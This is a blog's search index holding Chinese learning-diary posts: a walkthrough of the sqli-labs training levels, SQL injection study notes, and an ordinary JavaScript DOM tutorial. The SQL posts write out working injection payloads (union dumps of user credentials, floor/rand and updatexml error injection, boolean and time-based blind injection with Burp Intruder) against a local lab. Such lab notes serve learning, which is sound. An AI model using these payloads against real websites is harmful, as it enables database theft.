<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>sqli less</title>
    <link href="/2022/10/23/learning%20diary/sqli%20less%E9%97%AF%E5%85%B3%E6%97%A5%E8%AE%B0/"/>
    <url>/2022/10/23/learning%20diary/sqli%20less%E9%97%AF%E5%85%B3%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><h2 id="判断闭包"><a href="#判断闭包" class="headerlink" title="判断闭包 "></a>判断闭包 <img src="/2022/10/23/learning%20diary/sqli%20less%E9%97%AF%E5%85%B3%E6%97%A5%E8%AE%B0/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221023203559549.png" alt="image-20221023203559549"></h2><ol><li>有报错有回显</li></ol><p>   报错注入或者联合注入均可</p><ol start="2"><li><p>报错注入 </p><p> <a href="http://127.0.0.1/sqli/Less-4/?id=-1&quot;">http://127.0.0.1/sqli/Less-4/?id=-1&quot;</a>) </p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat((<span class="hljs-keyword">select</span> concat(id,username,&quot;~&quot;,password) <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))a,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p> 其中的information_schema.schemata 是必要的 否则外层select语句不完整报错直接退出,内层select语句和floor函数根本不会执行,可以换成information_schema.tables或者columns都ok</p><p> <img src="/2022/10/23/learning%20diary/sqli%20less%E9%97%AF%E5%85%B3%E6%97%A5%E8%AE%B0/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221023205038210.png" alt="image-20221023205038210"></p><p> 替换 limit n,1 就可以遍历所有用户</p><p> 注意group_concat的用法</p></li></ol><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p> 闭包方式为(‘$id’) 其他与less-3一样</p><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><ol><li><p><img src="/2022/10/23/learning%20diary/sqli%20less%E9%97%AF%E5%85%B3%E6%97%A5%E8%AE%B0/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221023210202281.png" alt="image-20221023210202281"></p><p>闭包为’$id’ 字段数为3</p></li><li><p><img src="/2022/10/23/learning%20diary/sqli%20less%E9%97%AF%E5%85%B3%E6%97%A5%E8%AE%B0/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221023210513670.png" alt="image-20221023210513670"></p><p>只有报错无回显位置</p></li><li><p><a href="http://127.0.0.1/sqli/Less-5/?id=-1&#39;">http://127.0.0.1/sqli/Less-5/?id=-1&#39;</a> </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat((<span class="hljs-keyword">select</span> concat(id,username,password) <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))a,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>简简单单</p></li></ol><h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>less-5的闭包改为”$id”即可</p><h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>布尔盲注<br><img src="/2022/10/23/learning%20diary/sqli%20less%E9%97%AF%E5%85%B3%E6%97%A5%E8%AE%B0/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024182025299.png" alt="image-20221024182025299"></p><p>正确有回显且只有you are in 无法用联合注入,错误无回显,</p><p><img src="/2022/10/23/learning%20diary/sqli%20less%E9%97%AF%E5%85%B3%E6%97%A5%E8%AE%B0/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024182442814.png" alt="image-20221024182442814"></p><p>数据库名为八位</p><p><img src="/2022/10/23/learning%20diary/sqli%20less%E9%97%AF%E5%85%B3%E6%97%A5%E8%AE%B0/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024182721997.png" alt="image-20221024182721997"></p><p>数据库名第一位为”s”</p><p>使用burpsuite爆破</p><p><img src="/2022/10/23/learning%20diary/sqli%20less%E9%97%AF%E5%85%B3%E6%97%A5%E8%AE%B0/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024184459938.png" alt="image-20221024184459938"></p><p><img src="/2022/10/23/learning%20diary/sqli%20less%E9%97%AF%E5%85%B3%E6%97%A5%E8%AE%B0/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024184508914.png" alt="image-20221024184508914"></p><p><img src="/2022/10/23/learning%20diary/sqli%20less%E9%97%AF%E5%85%B3%E6%97%A5%E8%AE%B0/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024184529731.png" alt="image-20221024184529731"></p><p>请求8 的长与其他不一样说明database()库名长为8</p><p>·Sniper（狙击手模式）：依次爆破，只能设置一个爆破点，比如知道了用户名就只对密码进行爆破。<br>·Battering ram（攻城锤模式）：同时爆破，可以设置多个爆破点，无论几个爆破点都共用一套字典，每次几个爆破点的值都相同。<br>·Pitchfork（叉子模式）：同时爆破，每个爆破点可用不同字典，一般按payload少的执行，比如payload1为9，payload2为10，执行9次。<br>·Cluster bomb（炸弹模式）：使用穷举法，对每个爆破点都遍历字典，适用于用户名和密码都不知道的情况。<br>例：标记三处，第一处字典3个，第二处字典2个，第三处字典3个，爆破次数：3<em>2</em>3</p><p><img src="/2022/10/23/learning%20diary/sqli%20less%E9%97%AF%E5%85%B3%E6%97%A5%E8%AE%B0/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024195355974.png" alt="image-20221024195355974"></p><p>得到库名security</p><p><img src="/2022/10/23/learning%20diary/sqli%20less%E9%97%AF%E5%85%B3%E6%97%A5%E8%AE%B0/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024201855753.png" alt="image-20221024201855753"></p><p>爆出四个表名 emails referers uagents users</p><p><img src="/2022/10/23/learning%20diary/sqli%20less%E9%97%AF%E5%85%B3%E6%97%A5%E8%AE%B0/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024203231646.png" alt="image-20221024203231646"></p><p>爆出users表下的三个字段名 id username password</p><p><img src="/2022/10/23/learning%20diary/sqli%20less%E9%97%AF%E5%85%B3%E6%97%A5%E8%AE%B0/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024205034782.png" alt="image-20221024205034782"></p><p>爆出用户id用户名密码 1 dumb dumb 2 angelina i-kill-you 3 dumm p@ssword</p><p>布尔盲注到此结束</p><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>输什么页面都只有固定显示 报错注入联合注入布尔盲注均不可行 只有时间(延时)盲注可以</p><p><img src="/2022/10/23/learning%20diary/sqli%20less%E9%97%AF%E5%85%B3%E6%97%A5%E8%AE%B0/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024210353622.png" alt="image-20221024210353622"></p><p>可以看出执行了sleep(5) 后台停止了五秒才返回结果</p><p><a href="http://127.0.0.1/sqli/Less-9/?id=1&#39;">http://127.0.0.1/sqli/Less-9/?id=1&#39;</a> </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> if(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>&quot;security&quot; limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-operator">=</span>&quot;#&quot;,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="/2022/10/23/learning%20diary/sqli%20less%E9%97%AF%E5%85%B3%E6%97%A5%E8%AE%B0/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024214452782.png" alt="image-20221024214452782"></p><p>爆出users表的列名 emails referers uagents users </p><p>核心语句和布尔盲注差不多 后续再爆表字段数字段名</p><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>less-9类似延迟盲注,不同点为闭包为”$id”,其余解题步骤一致</p><h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><p>请求头注入</p><p><img src="/2022/10/23/learning%20diary/sqli%20less%E9%97%AF%E5%85%B3%E6%97%A5%E8%AE%B0/image-20221027170221931.png" alt="image-20221027170221931"></p><p>less17 18 19 都差不多</p><h2 id="less-20-less-21-less-22"><a href="#less-20-less-21-less-22" class="headerlink" title="less-20 less-21 less-22"></a>less-20 less-21 less-22</h2><p>cookie注入 </p><p>这题的源码困扰了我一个下午,一点儿都不是标准的cookie,本地假cookie</p><p><img src="/2022/10/23/learning%20diary/sqli%20less%E9%97%AF%E5%85%B3%E6%97%A5%E8%AE%B0/image-20221028005821079.png" alt="image-20221028005821079"></p><p>补充知识 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> id,username,password <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username,password),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users ; <br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JavaScript HTML DOM</title>
    <link href="/2022/10/22/learning%20diary/javascript%20dom/"/>
    <url>/2022/10/22/learning%20diary/javascript%20dom/</url>
    
    <content type="html"><![CDATA[<h3 id="JavaScript-HTML-DOM"><a href="#JavaScript-HTML-DOM" class="headerlink" title="JavaScript HTML DOM"></a>JavaScript HTML DOM</h3><hr><p>通过 HTML DOM，可访问 JavaScript HTML 文档的所有元素。</p><hr><h3 id="HTML-DOM-文档对象模型"><a href="#HTML-DOM-文档对象模型" class="headerlink" title="HTML DOM (文档对象模型)"></a>HTML DOM (文档对象模型)</h3><p>当网页被加载时，浏览器会创建页面的文档对象模型（Document Object Model）。</p><h4 id="查找-HTML-元素"><a href="#查找-HTML-元素" class="headerlink" title="查找 HTML 元素"></a>查找 HTML 元素</h4><p>通常，通过 JavaScript，您需要操作 HTML 元素。</p><p>为了做到这件事情，您必须首先找到该元素。有三种方法来做这件事：</p><ul><li><p>通过 id 找到 HTML 元素</p><p>var x&#x3D;document.getElementById(“intro”);如果找到该元素，则该方法将以对象（在 x 中）的形式返回该元素。如果未找到该元素，则 x 将包含 null。</p></li><li><p>通过标签名找到 HTML 元素</p><p>var x&#x3D;document.getElementById(“main”);<br>var y&#x3D;x.getElementsByTagName(“p”);</p><p>本例查找 id&#x3D;”main” 的元素，然后查找 id&#x3D;”main” 元素中的所有 </p><p> 元素</p></li><li><p>通过类名找到 HTML 元素</p><p>var x&#x3D;document.getElementsByClassName(“intro”);</p></li></ul><h4 id="改变-HTML"><a href="#改变-HTML" class="headerlink" title="改变 HTML"></a>改变 HTML</h4><ol><li><p>JavaScript 中，document.write() 可用于直接向 HTML 输出流写内容 document.write(Date());</p></li><li><p>document.getElementById(<em>id</em>).innerHTML&#x3D;<em>新的 HTML</em> 改变 HTML 元素的内容</p></li><li><p>document.getElementById(<em>id</em>).<em>attribute&#x3D;新属性值</em> 改变 HTML 元素的属性</p></li><li><p>document.getElementById(<em>id</em>).style.<em>property</em>&#x3D;<em>新样式</em>  改变 HTML 元素的样式</p></li><li><p>addEventListener() 方法  在用户点击按钮时触发监听事件</p><p>document.getElementById(“myBtn”).addEventListener(“click”, displayDate);</p></li></ol><p>代码实例:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>该实例使用 addEventListener() 方法在按钮中添加点击事件。 <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myBtn&quot;</span>&gt;</span>点我<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;myBtn&quot;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;Hello World!&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">&#125;);</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>点击按钮触发监听事件,调用函数,输出结果</p><h4 id="JavaScript-异步编程"><a href="#JavaScript-异步编程" class="headerlink" title="JavaScript 异步编程"></a>JavaScript 异步编程</h4><p>同步按你的代码顺序执行，异步不按照代码顺序执行，异步的执行效率更高。</p><p>什么时候用异步编程</p><p>在前端编程中（甚至后端有时也是这样），我们在处理一些简短、快速的操作时，例如计算 1 + 1 的结果，往往在主线程中就可以完成。主线程作为一个线程，不能够同时接受多方面的请求。所以，当一个事件没有结束时，界面将无法处理其他请求。</p><p>现在有一个按钮，如果我们设置它的 onclick 事件为一个死循环，那么当这个按钮按下，整个网页将失去响应。</p><p>为了避免这种情况的发生，我们常常用子线程来完成一些可能消耗时间足够长以至于被用户察觉的事情，比如读取一个大文件或者发出一个网络请求。因为子线程独立于主线程，所以即使出现阻塞也不会影响主线程的运行。但是子线程有一个局限：一旦发射了以后就会与主线程失去同步，我们无法确定它的结束，如果结束之后需要处理一些事情，比如处理来自服务器的信息，我们是无法将它合并到主线程中去的。</p><p>为了解决这个问题，JavaScript 中的异步操作函数往往通过回调函数来实现异步任务的结果处理。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL Injection</title>
    <link href="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="Structured-Query-Language-of-Injection"><a href="#Structured-Query-Language-of-Injection" class="headerlink" title="Structured Query Language of Injection"></a>Structured Query Language of Injection</h3><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​      结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。</p><p>​       SQL注入（SQL Injection）是一种常见的Web安全漏洞，主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱库、被删除、甚至整个服务器权限陷）。</p><p>**<em>*即*<em>：*<em>注入产生的原因是后台服务器接收相关参数未经过滤直接带入数据库查询*</em></em></em></p><p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221023213612187.png" alt="image-20221023213612187"></p><h3 id="mysql补充"><a href="#mysql补充" class="headerlink" title="mysql补充"></a>mysql补充</h3><ol><li><p>information_schema数据库:确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与<a href="https://so.csdn.net/so/search?q=%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90&spm=1001.2101.3001.7020">访问权限</a>等。</p><p>其中有,</p><p>表:schemata:所有数据库名mysql实例中所有数据库的信息。是show databases的结果取之此表。</p><p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221022202221404.png" alt="image-20221022202221404"></p><p>columns:所有数据库的列名</p><p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221022202026254.png" alt="image-20221022202026254"></p><p>tables:所有数据库的表名</p><p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221022201950232.png" alt="image-20221022201950232"></p></li></ol><p>​    对于信息数据库参见:<a href="https://www.cnblogs.com/lyftest/p/8034470.html#schemata">https://www.cnblogs.com/lyftest/p/8034470.html#schemata</a> </p><h3 id="SQLI-less-1"><a href="#SQLI-less-1" class="headerlink" title="SQLI less-1"></a>SQLI less-1</h3><ul><li><p>url中? 用于分隔参数等</p></li><li><p>?id&#x3D;1 order by 3 –+  </p><p>爆当前表的字段数</p></li><li><p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a>  union select 1,2,3 –+</p><p>判断回显</p></li><li><p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a>  union select 4,database(),user() –+</p><p>爆数据库名 security</p></li><li><p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a>  union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() –+</p><p>爆该数据库的表 </p></li><li><p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a>  union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’users’ <strong>and table_schema&#x3D;’security’</strong> –+</p><p>爆列字段数及字段值 id username password</p></li><li><p><a href="http://127.0.0.1/sqli/Less-1/?id=-1&#39;">http://127.0.0.1/sqli/Less-1/?id=-1&#39;</a>  union select 1,group_concat(id,’-‘,username,’-‘,password),3 from users –+</p><p>得出所有数据</p><p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221022203009884.png" alt="image-20221022203009884"></p></li></ul><h3 id="联合查询-union注入"><a href="#联合查询-union注入" class="headerlink" title="联合查询(union注入)"></a>联合查询(union注入)</h3><p>$sql&#x3D;”SELECT * FROM users WHERE id&#x3D;’$id’ LIMIT 0,1”;</p><p>?id&#x3D;1 and 1&#x3D;1     ?id&#x3D;1 and 1&#x3D;2 </p><p>$sql&#x3D;”SELECT * FROM users WHERE id&#x3D;’1 and 1&#x3D;1’ LIMIT 0,1”;</p><p>两种回显结果都一样,判断为字符型注入</p><ol><li>判断注入点,?id&#x3D;1 </li><li>判断注入类型 整型or 字符型</li><li>判断字段数 order by</li><li>判断回显位 select 1,2,3 </li><li>爆表名  ?id&#x3D;-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() –+</li><li>爆表字段 ?id&#x3D;-1 union select 1,group_concat(table_column),3 from information_schema.columns where table_schema&#x3D;database and table_name&#x3D;(上一步的表名)</li></ol><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>无法判断显示位 但页面会根据我们输入错误的SQL语法而报错，所以采用报错注入的方法解决.报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。简单点说，就是在可以进行<a href="https://so.csdn.net/so/search?q=sql%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">sql注入</a>的位置，调用特殊的函数执行，利用函数报错使其输出错误结果来获取数据库的相关信息</p><p><em><strong>*报错注入的种类？*</strong></em></p><h3 id="1-BigInt数据类型溢出"><a href="#1-BigInt数据类型溢出" class="headerlink" title="1.BigInt数据类型溢出"></a><strong>1.BigInt数据类型溢出</strong></h3><h3 id="2-函数参数格式错误"><a href="#2-函数参数格式错误" class="headerlink" title="2.函数参数格式错误"></a><strong>2.函数参数格式错误</strong></h3><ul><li><p>UPDATEXML (XML_document, XPath_string, new_value); </p></li><li><p>extractValue(XML_document, XPath_string)</p><p>第一个参数：XML_document是String格式，为XML文档对象的名称， </p><p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 </p><p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p><p>第二个参数需要的是Xpath格式的字符串，看这个payload： updatexml(1,concat(0x7e,version(),0))，明显是不符合的，所以出现了报错。</p></li><li><p><a href="http://127.0.0.1/sqli/Less-2/?id=1">http://127.0.0.1/sqli/Less-2/?id=1</a> and updatexml(1,concat(0x7e,(select   column_name from information_schema.columns where  table_schema &#x3D;’security’ and table_name&#x3D;’users’ limit 1,1 ),0x7e),2)–+ </p><p>报错信息 <img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221023181337948.png" alt="image-20221023181337948"></p><p>xpath格式不对 主要是第二个参数 undatexml(“<del>“,要查询的语句,”</del>“)</p></li></ul><h3 id="3-主键冲突（重复）"><a href="#3-主键冲突（重复）" class="headerlink" title="3.主键冲突（重复）"></a><strong>3.主键冲突（重复）</strong></h3><ul><li><p>floor(x) count(*) rand() group by 四个特定函数组合会产生报错</p></li><li><p>固定语句 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(查询语句,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)a) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><a href="http://127.0.0.1/sqli/Less-2/?id=-1">http://127.0.0.1/sqli/Less-2/?id=-1</a> </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))a,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221023184201213.png" alt="image-20221023184201213"></p><p>爆出第一个字段名为id,更改limit 爆出其他字段 </p><p>几个值得注意的点:</p><p>1.第二个select 1,2,3 字段数得和前面被屏蔽的select字段数一致</p><p>2.concat(select,floor())如果select语句查询不到结果返回为null的话,concat就返回null,而不会执行floor()函数,进而不会产生报错</p><p>3.group_concat(字段) 把字段值打印在一排 <img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221023195355356.png" alt="image-20221023195355356"></p></li></ul><h3 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h3><ul><li><p>盲注：即在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试，这个过程成为盲注</p></li><li><p>1.如果数据库运行返回结果时只反馈对错不会返回数据库中的信息 此时可以采用逻辑判断是否正确的盲注来获取信息。<br>2.盲注是不能通过直接显示的途径来获取数据库数据的方法。<br>在盲注中，攻击者根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响应时间不同，一般分为三类）</p></li><li><p>（1）基于<a href="https://so.csdn.net/so/search?q=%E5%B8%83%E5%B0%94&spm=1001.2101.3001.7020">布尔</a>的SQL盲注<br>（2）基于时间的SQL盲注<br>（3）基于报错的SQL盲注</p></li><li><p>布尔盲注<br><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024182025299.png" alt="image-20221024182025299"></p><p>正确有回显且只有you are in 无法用联合注入,错误无回显,</p><p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024182442814.png" alt="image-20221024182442814"></p><p>数据库名为八位</p><p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024182721997.png" alt="image-20221024182721997"></p><p>数据库名第一位为”s”</p><p>使用burpsuite爆破</p><p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024184459938.png" alt="image-20221024184459938"></p><p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024184508914.png" alt="image-20221024184508914"></p><p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024184529731.png" alt="image-20221024184529731"></p><p>请求8 的长与其他不一样说明database()库名长为8</p><p>·Sniper（狙击手模式）：依次爆破，只能设置一个爆破点，比如知道了用户名就只对密码进行爆破。<br>·Battering ram（攻城锤模式）：同时爆破，可以设置多个爆破点，无论几个爆破点都共用一套字典，每次几个爆破点的值都相同。<br>·Pitchfork（叉子模式）：同时爆破，每个爆破点可用不同字典，一般按payload少的执行，比如payload1为9，payload2为10，执行9次。<br>·Cluster bomb（炸弹模式）：使用穷举法，对每个爆破点都遍历字典，适用于用户名和密码都不知道的情况。<br>例：标记三处，第一处字典3个，第二处字典2个，第三处字典3个，爆破次数：3<em>2</em>3</p><p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024195355974.png" alt="image-20221024195355974"></p><p>得到库名security</p><p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024201855753.png" alt="image-20221024201855753"></p><p>爆出四个表名 emails referers uagents users</p><p><img src="/2022/10/22/learning%20diary/sql%E6%B3%A8%E5%85%A5/Users\Crush\AppData\Roaming\Typora\typora-user-images\image-20221024203231646.png" alt="image-20221024203231646"></p><p>爆出users表下的三个字段名 id username password</p><p><img 